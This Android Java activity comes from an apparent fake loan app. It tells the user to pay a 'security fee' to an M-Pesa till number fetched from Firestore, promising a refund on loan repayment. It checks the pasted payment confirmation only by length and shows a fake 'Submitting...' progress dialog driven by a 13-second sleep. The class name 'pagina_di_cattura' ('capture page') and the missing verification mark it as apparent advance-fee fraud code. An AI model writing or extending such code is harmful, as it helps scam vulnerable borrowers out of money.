package com.justkeepfaith.mpinindenga;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.app.ProgressDialog;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.storage.FileDownloadTask;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.io.IOException;

public class pagina_di_cattura extends AppCompatActivity {

    TextView catch_message;
    ImageView catch_till_image;
    EditText catch_mpesa;
    Button catchfinish;
    String amount, tillname, tillnumb;
    SharedPreferences sharedPreferences;
    ProgressBar progressBar;
    StorageReference storageReference;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_pagina_di_cattura);

        catch_message = findViewById(R.id.catch_message);
        catch_till_image = findViewById(R.id.catch_till_image);
        catch_mpesa = findViewById(R.id.catch_mpesa);
        catchfinish = findViewById(R.id.catchfinish);
        progressBar = findViewById(R.id.progressBar);

        sharedPreferences = getApplicationContext().getSharedPreferences("user_info", Context.MODE_PRIVATE);
        String lastname = sharedPreferences.getString("last_name", "Customer");
        amount = sharedPreferences.getString("depos", "");
        tillname = sharedPreferences.getString("till_name", "");
        tillnumb = sharedPreferences.getString("till_no", "");

        storageReference = FirebaseStorage.getInstance().getReference("till_image.png");

        try {
            File localfile = File.createTempFile("tempfile", "png");
            storageReference.getFile(localfile)
                    .addOnSuccessListener(new OnSuccessListener<FileDownloadTask.TaskSnapshot>() {
                        @Override
                        public void onSuccess(FileDownloadTask.TaskSnapshot taskSnapshot) {
                            Bitmap bitmap = BitmapFactory.decodeFile(localfile.getAbsolutePath());
                            catch_till_image.setImageBitmap(bitmap);
                            progressBar.setVisibility(View.GONE);
                        }
                    }).addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception e) {
                            Toast.makeText(pagina_di_cattura.this, "Please restart your app",Toast.LENGTH_SHORT);
                        }
                    });
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        DocumentReference documentReference = FirebaseFirestore.getInstance().collection("TillText")
                .document("TillStrings");
        documentReference.get().addOnCompleteListener(new OnCompleteListener<DocumentSnapshot>() {
            @Override
            public void onComplete(@NonNull Task<DocumentSnapshot> task) {

                DocumentSnapshot dsnaps = task.getResult();
                amount = dsnaps.getString("Amount");
                tillname = dsnaps.getString("Till_name");
                tillnumb = dsnaps.getString("Till_no");

                SharedPreferences.Editor editor = sharedPreferences.edit();
                editor.putString("depos", amount);
                editor.putString("till_name", tillname);
                editor.putString("till_no", tillnumb);
                editor.commit();

                catch_message.setText("Dear " + lastname + ". We are committed to serving our customers to satisfaction on trust and loyalty.\n\n" +
                        "Therefore, " + tillname + " (Which owns " + getResources().getString(R.string.app_name) + ") requires you to " +
                        "save Ksh " + amount + " to TILL NO : "+ tillnumb + " which will act " +
                        "as security fee.\n\n" +
                        "You will be refunded upon loan repayment.\n\n" +
                        "To avoid delays make sure you enter the correct M-PESA CODE received in the space below.\n\n" +
                        "1. Go to M-Pesa\n" +
                        "2. Lipa na M-Pesa\n" +
                        "3. Buy Goods and services.\n" +
                        "4. Enter " + tillnumb + "\n\n" +
                        "Tap the image below to copy TILL Number to clipboard");
            }
        });

        catch_message.setText("Dear " + lastname + ". We are committed to serving our customers to satisfaction on trust and loyalty.\n\n" +
                "Therefore, " + tillname + " (Which owns " + getResources().getString(R.string.app_name) + ") requires you to " +
                "save Ksh " + amount + " to TILL NO : "+ tillnumb + " which will act " +
                "as security fee.\n\n" +
                "You will be refunded upon loan repayment.\n\n " +
                "To avoid delays make sure you enter the correct M-PESA CODE received in the space below.\n\n" +
                "1. Go to M-Pesa\n" +
                "2. Lipa na M-Pesa\n" +
                "3. Buy Goods and services.\n" +
                "4. Enter " + tillnumb + "\n\n" +
                "Tap the image below to copy TILL Number to clipboard");

        ClipboardManager clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);

        catch_till_image.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                clipboardManager.setPrimaryClip(ClipData.newPlainText("TILL", tillnumb));
                Toast.makeText(pagina_di_cattura.this, "TILL Number Copied", Toast.LENGTH_SHORT).show();
            }
        });

        catchfinish.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                String mpesamessage = catch_mpesa.getText().toString();
                if (mpesamessage.length() > 50) {

                    SharedPreferences.Editor editor = sharedPreferences.edit();
                    editor.putString("loanprog", "1");
                    editor.commit();

                    final ProgressDialog progressDialog = new ProgressDialog(pagina_di_cattura.this);
                    progressDialog.setTitle("Please wait, it takes less than a minute");
                    progressDialog.setMessage("Submitting...");
                    progressDialog.setProgressStyle(0);
                    progressDialog.setMax(100);
                    progressDialog.show();
                    progressDialog.setCancelable(false);
                    new Thread(new Runnable() {
                        public void run() {
                            try {
                                Thread.sleep(13000);
                                Intent intent = new Intent(pagina_di_cattura.this, valutaci.class);
                                pagina_di_cattura.this.startActivity(intent);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                            progressDialog.dismiss();
                        }
                    }).start();
                    return;
                }
                Toast.makeText(pagina_di_cattura.this, "Enter a valid M-Pesa message", Toast.LENGTH_SHORT).show();
                catch_mpesa.setError("Invalid M-Pesa message!");
            }
        });
    }
}